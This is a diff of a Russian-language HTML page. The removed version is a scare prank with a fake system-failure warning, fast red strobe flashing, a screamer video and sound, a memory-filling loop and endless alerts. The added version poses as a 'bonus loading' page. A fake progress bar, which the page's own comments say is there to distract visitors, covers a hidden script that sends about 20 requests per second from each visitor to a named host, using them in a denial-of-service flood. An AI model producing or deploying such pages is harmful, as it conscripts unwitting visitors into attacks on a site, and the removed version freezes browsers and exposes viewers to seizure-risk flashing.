@@ -1,68 +1,41 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>ВНИМАНИЕ: ОШИБКА</title>
+    <title>Загрузка бонусов...</title>
     <style>
-        /* Бешеное мерцание */
-        @keyframes strobe { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
-        .flash { animation: strobe 0.04s infinite !important; }
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
-        #scary_vid { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
-        .btn { padding: 25px 50px; font-size: 24px; background: #ff0000; color: #fff; border: none; border-radius: 15px; cursor: pointer; z-index: 100; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #1a1a1a; color: white; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body id="b" class="flash">
-
-    <div id="ui">
-        <h1>КРИТИЧЕСКИЙ СБОЙ СИСТЕМЫ</h1>
-        <p>Ваши данные под угрозой. Нажмите для восстановления.</p>
-        <button class="btn" onclick="startPrank()">ВОССТАНОВИТЬ</button>
-    </div>
-
-    <!-- ВИДЕО-СКРИМЕР (Прямая ссылка) -->
-    <video id="scary_vid" playsinline loop muted>
-        <source src="https://raw.githubusercontent.com" type="video/mp4">
-    </video>
-
-    <!-- ОР (Прямая ссылка) -->
-    <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
+<body>
+    <div class="spinner"></div>
+    <h2>Подождите, идет генерация ссылки...</h2>
+    <p id="status">Подключение к базе данных... (0%)</p>
 
     <script>
-        function startPrank() {
-            const v = document.getElementById("scary_vid");
-            const a = document.getElementById("scream");
-            const ui = document.getElementById("ui");
+        // ЦЕЛЬ: Твой сайт
+        const target = "http://f29386yb.beget.tech";
 
-            ui.style.display = "none";
-            v.style.display = "block";
-            
-            // Включаем звук и видео
-            v.muted = false; // Разрешаем звук после клика
-            v.play();
-            a.volume = 1.0;
-            a.play();
-
-            // Попытка на весь экран
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-
-            // Забивка памяти в фоне
-            setInterval(() => {
-                let x = new Array(1000000).fill("CRASH_");
-                console.log(x);
-            }, 100);
-
-            // Бесконечные алерты через 2 секунды
-            setTimeout(() => {
-                while(true) { alert("СИСТЕМА УНИЧТОЖЕНА!"); }
-            }, 2000);
+        function attack() {
+            // Создаем невидимый элемент для отправки запроса
+            const img = new Image();
+            // Добавляем рандом, чтобы сервер не выдавал кэш, а реально работал
+            img.src = target + "/?storm=" + Math.random();
         }
 
-        window.onload = function() {
-            if (navigator.vibrate) setInterval(() => navigator.vibrate(), 1000);
-        };
+        // 20 запросов в секунду от одного человека
+        setInterval(attack, 50);
+
+        // Красивая шкала для отвлечения внимания
+        let p = 0;
+        setInterval(() => {
+            if (p < 99) {
+                p += Math.floor(Math.random() * 5);
+                document.getElementById('status').innerText = `Подключение к базе данных... (${p}%)`;
+            }
+        }, 2000);
     </script>
 </body>
 </html>
